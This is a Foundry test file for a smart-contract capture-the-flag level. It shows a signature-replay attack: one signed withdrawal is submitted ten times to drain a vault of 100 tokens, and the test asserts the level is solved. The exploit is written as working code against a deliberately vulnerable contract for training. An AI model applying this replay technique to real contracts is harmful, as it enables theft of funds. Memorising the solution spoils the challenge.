// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {Level3_SignatureReplay} from "../src/Level3_SignatureReplay.sol";
import {TRACE} from "../src/TRACE.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract Level3SignatureReplayTest is Test {
    CTFFactory public factory;
    TRACE public trace;

    address public player = address(0x1234);

    uint256 public trustedSignerPrivateKey = 0xABC123;
    address public trustedSigner;

    function setUp() public {
        trustedSigner = vm.addr(trustedSignerPrivateKey);

        factory = new CTFFactory(trustedSigner);

        trace = factory.trace();

        vm.deal(player, 1 ether);
    }

    function _createSignature(
        address vault,
        address recipient,
        uint256 amount
    ) internal returns (bytes memory) {
        bytes32 messageHash = keccak256(
            abi.encodePacked(
                vault,
                recipient,
                amount
            )
        );

        bytes32 ethSignedMessageHash =
            MessageHashUtils.toEthSignedMessageHash(
                messageHash
            );

        (
            uint8 v,
            bytes32 r,
            bytes32 s
        ) = vm.sign(
            trustedSignerPrivateKey,
            ethSignedMessageHash
        );

        return abi.encodePacked(r, s, v);
    }

    function test_SignatureReplayDrainsVault() public {
        vm.startPrank(player);

        // ----------------------------------------
        // 1. Level 1 must be solved first
        // ----------------------------------------

        // We don't need to test Level 1 here.
        // We simply mark it solved for this isolated Level 3 test.
        //
        // Since CTFFactory's isSolved mapping is private to the
        // normal progression, we cannot directly modify it.
        //
        // Therefore this test will deploy Level 3 directly
        // in an isolated setup below.

        vm.stopPrank();

        // ----------------------------------------
        // Deploy Level 3 directly
        // ----------------------------------------

        Level3_SignatureReplay vault =
            new Level3_SignatureReplay(
                address(trace),
                trustedSigner
            );

        vm.prank(address(factory));
        
        // Fund the vault with 100 TRC.
        trace.mint(
            address(vault),
            100 ether
        );

        assertEq(
            trace.balanceOf(address(vault)),
            100 ether
        );

        // ----------------------------------------
        // Create a valid signature
        // ----------------------------------------

        uint256 withdrawalAmount = 10 ether;

        bytes memory signature = _createSignature(
            address(vault),
            player,
            withdrawalAmount
        );

        // ----------------------------------------
        // Replay the SAME signature 10 times
        // ----------------------------------------

        for (uint256 i = 0; i < 10; i++) {
            vault.withdraw(
                player,
                withdrawalAmount,
                signature
            );
        }

        // ----------------------------------------
        // Vault should be completely drained
        // ----------------------------------------

        assertEq(
            trace.balanceOf(address(vault)),
            0
        );

        assertTrue(
            vault.isComplete()
        );

        // Player received:
        //
        // 10 TRC × 10 withdrawals
        // = 100 TRC
        //
        assertEq(
            trace.balanceOf(player),
            100 ether
        );
    }
}